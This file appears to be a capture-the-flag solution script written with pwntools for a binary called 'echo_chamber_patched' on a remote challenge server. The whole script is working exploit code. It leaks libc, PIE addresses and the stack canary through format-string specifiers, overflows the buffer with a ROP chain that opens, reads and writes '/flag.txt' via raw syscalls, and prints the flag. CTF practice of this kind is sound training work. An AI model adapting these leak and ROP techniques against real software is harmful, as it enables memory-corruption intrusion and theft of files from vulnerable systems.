#!/usr/bin/env python
from pwn import *

elf = context.binary = ELF('./echo_chamber_patched', checksec = False)
# conn = elf.process()
libc = ELF('./libc-2.27.so', checksec = False)

host = '0.cloud.chals.io'
port = 33744
conn = remote(host, port)

def send_msg(payload):
    conn.recvuntil(b'message: ')
    conn.sendline(payload)

send_msg(b'%p')
libc_leak = int(conn.recv(14).decode(), 16) - 131
log.info("_IO_2_1_stdin_@GLIBC: " + hex(libc_leak))

libc_base = libc_leak - libc.symbols['_IO_2_1_stdin_']
libc.address = libc_base
log.success("Libc base: " + hex(libc_base))

send_msg(b'%15$p')
canary = int(conn.recvline().strip().decode(), 16)
log.success("Canary: " + hex(canary))

send_msg(b'%17$p')

pie_leak = int(conn.recvline().strip().decode(), 16) - 24
log.info("PIE leak: " + hex(pie_leak))

pie_base = pie_leak - elf.symbols['main']
elf.address = pie_base
log.success("PIE base: " + hex(pie_base))

bss = pie_base + 0x202020
pop_rdi = pie_base + 0xcd3
ret = pie_base + 0x8be
pop_rsi = libc_base + 0x23a6a
pop_rdx = libc_base + 0x1b96
pop_rax = libc_base + 0x1b500
syscall = libc_base + 0xd2625

# payload = b'A' * 64 + p64(canary) + b'B' * 8
payload = b'A' * 72 + p64(canary)  + b'B' * 8 + p64(ret)

# open 
payload += p64(pop_rdi) + p64(bss + 0x30)
payload += p64(elf.plt['gets'])
payload += p64(pop_rdi) + p64(bss + 0x30)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(2)
payload += p64(syscall) + p64(ret)

# read 
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi) + p64(bss + 0x30)
payload += p64(pop_rax) + p64(0)
payload += p64(pop_rdx) + p64(0x25)
payload += p64(syscall) + p64(ret)

# write
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(bss + 0x30)
payload += p64(pop_rax) + p64(0x1)
payload += p64(pop_rdx) + p64(0x25)
payload += p64(syscall) + p64(ret)

send_msg(payload)
send_msg(b'x')
conn.sendline(b'/flag.txt')

conn.recv(1)
flag = conn.recvuntil(b'}').decode()

log.info("Flag: " + flag)

# conn.interactive()
